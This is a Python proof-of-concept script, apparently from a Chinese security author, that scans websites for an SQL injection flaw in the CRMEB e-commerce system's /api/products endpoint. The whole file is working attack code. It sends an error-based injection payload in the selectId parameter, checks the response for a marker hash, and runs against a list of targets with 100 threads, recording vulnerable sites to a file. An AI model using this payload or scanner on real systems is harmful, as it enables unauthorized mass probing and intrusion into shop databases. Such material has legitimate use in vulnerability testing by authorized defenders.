import sys
import requests
import argparse
import re
from multiprocessing.dummy import Pool
import logging

# 禁用urllib3警告
requests.packages.urllib3.disable_warnings()

# 设置日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'


# 定义程序的横幅
def banner():
    test = r"""

  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|



                            version:1.1.0
                            author:fangwei                              
"""
    logging.info(test)


# 主函数，解析命令行参数并调用相应的功能函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="CRMEB电商系统apiproducts SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logging.error(f"Usage:\n\t python3 {sys.argv[0]} -h")


# 检测漏洞函数，向目标URL发送请求，检查是否存在漏洞
def poc(target):
    payload_url = ('/api/products?limit=20&priceOrder&salesOrder&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT('
                   '3550=3550,md5(1436528)))),0x7e),3550)')
    url = target + payload_url
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) '
                      'Version/11.1.2 Safari/605.1.15',
        'Connection': 'close',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Accept-Encoding': 'gzip',
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }

    try:
        res = requests.get(url=url, headers=headers, timeout=8, verify=False, proxies=proxies)

        if res.status_code == 200 and "81a9eb3487199f3a2da3e3f6591ffd62" in res.text:
            logging.info(f"{GREEN}[+]该网站存在SQL注入漏洞，url为{target}\n{RESET}")
            with open("crmebRE.txt", "a", encoding="utf-8") as fp:
                fp.write(target + '\n')
        else:
            logging.info(f"[-]该网站不存在SQL注入漏洞")

    except Exception as e:
        logging.error(f"[*]该网站无法访问，url为{target}, 错误信息: {e}")


# 程序入口点
if __name__ == '__main__':
    main()

